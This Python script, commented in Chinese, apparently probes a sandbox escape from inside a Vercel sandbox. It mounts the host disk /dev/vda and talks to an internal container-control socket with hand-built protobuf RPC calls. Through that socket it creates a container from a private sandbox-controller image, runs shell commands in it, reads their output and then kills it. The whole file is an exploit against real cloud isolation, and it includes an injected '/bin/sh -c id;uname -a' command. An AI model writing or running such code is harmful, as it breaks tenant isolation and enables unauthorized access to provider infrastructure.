# -*- coding: utf-8 -*-
"""vda19_exec_chain: unary 无 shutdown + Exec connect+proto 完整链
P1: Create(json, 无 shutdown) -> Start -> 存活
P2: Exec connect+proto (container_id=1, command=2, shutdown) -> process_id?
P3: Process StreamOutput (process_id + stdout=2)
P4: 容器 StreamOutput / Kill
输出落盘 + 哨兵 V19F_DONE"""
import os, time, socket, ctypes, re, struct

OUT = '/vercel/sandbox/v19f.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_raw(sockpath, path, body, ctype, t=6, shutdown_wr=False):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if isinstance(body, str):
            body = body.encode()
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        if shutdown_wr:
            try:
                s.shutdown(socket.SHUT_WR)
            except Exception:
                pass
        data = b''
        while True:
            try:
                chunk = s.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:1200].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def env_proto(payload):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def pbool(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    out.append(1 if v else 0)
    return bytes(out)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CSVC = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # P1: Create (json, 无 shutdown) + Start
    log('=== P1 Create+Start ===')
    cid = None
    for attempt in range(3):
        st, bd = rpc_raw(sp, CSVC + '/Create', '{"image":"%s","command":"/bin/sleep 300"}' % IMG,
                         'application/json', t=45)
        log('create#%d -> %s | %s' % (attempt, st, bd[:250]))
        m = re.search(r'"containerId":\s*"([^"]+)"', bd)
        if m:
            cid = m.group(1)
            log('CID=%s' % cid)
            break
        if '499' in st or 'NORESP' in st:
            time.sleep(2)
            continue
        break
    if cid:
        st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % cid, 'application/json', t=10)
        log('start -> %s | %s' % (st, bd[:200]))

    # P2: Exec connect+proto (shutdown)
    log('=== P2 Exec proto ===')
    pid = None
    if cid:
        for cmd in ['id', '/bin/sh -c id;uname -a;echo MARKER-7f3a']:
            payload = pstr(1, cid) + pstr(2, cmd)
            st, bd = rpc_raw(sp, CSVC + '/Exec', env_proto(payload), 'application/connect+proto', t=12, shutdown_wr=True)
            log('exec %-40s -> %s | %s' % (cmd, st, bd[:400].replace('\n', ' ')))
            m = re.search(r'"(?:processId|process_id)":\s*"([^"]+)"', bd)
            if m:
                pid = m.group(1)
                log('PID=%s' % pid)
            time.sleep(0.5)

    # P3: Process StreamOutput
    log('=== P3 Process StreamOutput ===')
    if pid:
        payload = pstr(1, pid) + pbool(2, True)
        st, bd = rpc_raw(sp, PSVC + '/StreamOutput', env_proto(payload), 'application/connect+proto', t=8, shutdown_wr=True)
        log('stream stdout -> %s | %s' % (st, bd[:500].replace('\n', ' ')))
    else:
        # 无 pid: 用假 id 验证错误消息差异
        pid27 = 'hvcp_' + 'a' * 27
        payload = pstr(1, pid27) + pbool(2, True)
        st, bd = rpc_raw(sp, PSVC + '/StreamOutput', env_proto(payload), 'application/connect+proto', t=5, shutdown_wr=True)
        log('stream fake -> %s | %s' % (st, bd[:300].replace('\n', ' ')))

    # P4: Kill
    if cid:
        st, bd = rpc_raw(sp, CSVC + '/Kill', '{"container_id":"%s"}' % cid, 'application/json', t=5)
        log('kill -> %s | %s' % (st, bd[:150]))

    log('V19F_DONE')
    f.close()


if __name__ == '__main__':
    main()
